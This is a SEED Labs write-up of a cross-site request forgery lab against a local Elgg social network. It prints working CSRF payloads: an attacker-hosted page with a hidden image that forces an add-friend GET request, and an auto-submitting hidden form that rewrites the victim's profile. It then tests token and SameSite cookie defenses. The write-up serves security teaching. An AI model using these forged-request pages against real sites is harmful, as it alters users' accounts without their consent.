**Difficulty:** Intermediate
**Environment:** SEED Labs (Elgg Social Network — Docker)

---
## Overview

This lab explores Cross-Site Request Forgery (CSRF) vulnerabilities against a real social networking application (Elgg). Tasks cover HTTP request analysis, CSRF exploitation via both GET and POST requests, and implementation of modern CSRF defenses including token validation and SameSite cookies.

**Concepts Covered:** HTTP request analysis · CSRF GET attacks · CSRF POST attacks · CSRF tokens · SameSite cookie policy · Cross-origin request behavior

---

## Lab Environment

Docker-based environment with the following hosts:

```
10.9.0.5    www.seed-server.com   (vulnerable Elgg social network)
10.9.0.5    www.example32.com     (same-site test)
10.9.0.105  www.attacker32.com    (attacker-controlled server)
```

DNS mappings added to `/etc/hosts` to simulate real domain-based attacks.

**Test accounts:**
- **Alice** (victim) — GUID: 56
- **Samy** (attacker) — GUID: 59

---

### Task 1 — Observing HTTP Requests

#### Approach
Used browser developer tools to intercept and analyze HTTP requests during login on `www.seed-server.com`.

Observed that HTTP requests contain sensitive information including usernames, passwords, session tokens, and other authentication data transmitted between client and server.

#### Key Takeaway
HTTP request analysis is the foundation of web application security testing. Understanding what data is transmitted — and how — is essential before attempting any web attack. Unencrypted HTTP transmits credentials in plaintext, making it trivially sniffable on the network.

---

### Task 2 — CSRF Attack via GET Request

#### Approach
**Step 1 — Identify the add-friend API endpoint:**
By inspecting the HTTP headers when adding a friend, the following GET request was identified:

```
http://www.seed-server.com/action/friends/add?friend=56
```

The `friend` parameter takes the target user's GUID.

**Step 2 — Find Samy's GUID:**
Inspected Samy's profile page source code — GUID: `59`

**Step 3 — Craft the malicious page:**
Created `addfriend.html` on the attacker's server (`www.attacker32.com`) containing a hidden image tag that fires the add-friend GET request when loaded:

```html
<html>
<body>
<h1>This page forges an HTTP GET request</h1>
<img src="http://www.seed-server.com/action/friends/add?friend=59"
     alt="image" width="1" height="1" />
</body>
</html>
```

**Step 4 — Execute the attack:**
While Alice had an active session on `www.seed-server.com`, she visited the attacker's page at `www.attacker32.com/addfriend.html`. The browser automatically loaded the hidden image, firing the GET request with Alice's session cookie attached.

**Result:** Alice's friend list now showed Samy — without Alice ever intentionally adding him.

#### Key Takeaway
CSRF exploits the browser's automatic attachment of session cookies to any request matching the target domain — regardless of which site initiated the request. GET-based state changes are particularly dangerous because browsers load GET requests automatically (images, scripts, iframes) without user interaction.

---

### Task 3 — CSRF Attack via POST Request

#### Approach
**Step 1 — Capture the profile edit POST request:**
Intercepted the HTTP POST request when editing a profile. The request contained a CSRF token and timestamp:

```
__elgg_token=kLplrXYxORidix1h23SqtQ
__elgg_ts=1764731089
name=Samy
briefdescription=samy is hacker
guid=59
```

**Step 2 — Craft the malicious POST form:**
Created `editprofile.html` on the attacker's server that auto-submits a POST form targeting Alice's profile (GUID: 56):

```html
<html>
<body>
<form action="http://www.seed-server.com/action/profile/edit"
      method="post" id="csrf-form">
  <input type="hidden" name="name" value="Alice"/>
  <input type="hidden" name="briefdescription" value="Hacked!"/>
  <input type="hidden" name="accesslevel[briefdescription]" value="2"/>
  <input type="hidden" name="guid" value="56"/>
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

**Result:** Successfully modified Alice's profile description without her knowledge or consent, demonstrating a CSRF POST attack.

#### Key Takeaway
POST-based CSRF is more dangerous than GET because it can modify server-side data. The browser automatically attaches Alice's session cookie to any POST request targeting the seed-server domain — even when the form originates from attacker32.com.

---

### Task 4 — CSRF Defense: Token Validation

#### Approach
Enabled Elgg's built-in CSRF countermeasure by modifying the CSRF validation file inside the Docker container to activate token checking.

**How it works:**
The server generates a unique, unpredictable token (`__elgg_token`) for each session and embeds it in every form. When a form is submitted, the server validates that the token matches the session. An attacker on a different origin cannot read this token due to the Same-Origin Policy — so forged requests fail validation.

**Result after enabling:**
Re-running both the GET and POST CSRF attacks produced the error:

```
Form is missing __token or __ts fields
```

Both attacks were completely blocked.

#### Key Takeaway
CSRF tokens are the standard defense against CSRF attacks. They work because:
1. The token is embedded in the page (requires reading the DOM)
2. The Same-Origin Policy prevents cross-origin JavaScript from reading the token
3. Without the valid token, the server rejects the request

---

### Task 5 — CSRF Defense: SameSite Cookie Policy

#### Approach
Tested three SameSite cookie configurations against both same-site and cross-site requests:

| Cookie Type | Same-site GET | Same-site POST | Cross-site GET (link) | Cross-site GET (form) | Cross-site POST |
|-------------|--------------|----------------|----------------------|----------------------|----------------|
| `SameSite=None` | ✅ Sent | ✅ Sent | ✅ Sent | ✅ Sent | ✅ Sent |
| `SameSite=Lax` | ✅ Sent | ✅ Sent | ✅ Sent | ❌ Blocked | ❌ Blocked |
| `SameSite=Strict` | ✅ Sent | ✅ Sent | ❌ Blocked | ❌ Blocked | ❌ Blocked |

**Experiment A (same-site: example32.com → example32.com):**
All three cookie types were sent for all request types.

**Experiment B (cross-site: attacker32.com → example32.com):**
- `Lax`: GET link requests allowed, GET form and POST requests blocked
- `Strict`: All cross-site requests blocked

Setting the session cookie to `SameSite=Lax` would have prevented the CSRF attacks in Tasks 2 and 3.

#### Key Takeaway
SameSite cookie policy is a powerful browser-level CSRF defense:
- `Strict` provides maximum protection but may break legitimate cross-site navigation
- `Lax` balances security and usability — blocks dangerous cross-site POST requests while allowing normal link navigation
- `None` provides no CSRF protection and should only be used with Secure flag on HTTPS

---

## Attack vs Defense Summary

| Attack | Technique | Defense |
|--------|-----------|---------|
| CSRF GET | Hidden image tag auto-fires GET request with victim's session | CSRF tokens, SameSite=Lax |
| CSRF POST | Auto-submitting form with victim's session cookie | CSRF tokens, SameSite=Lax/Strict |

---

## Key Concepts Learned

* **CSRF exploits browser trust** — browsers automatically attach cookies to matching-domain requests regardless of origin
* **GET requests should never change state** — any state-changing action must use POST at minimum
* **CSRF tokens are unpredictable** — the Same-Origin Policy prevents attackers from reading tokens from cross-origin pages
* **SameSite=Lax** is the modern default and prevents most CSRF attacks without breaking normal navigation
* **Defense in depth** — combining CSRF tokens AND SameSite cookies provides the strongest protection
* **HTTP request analysis** is the foundation of web security testing — understanding what's transmitted is the first step
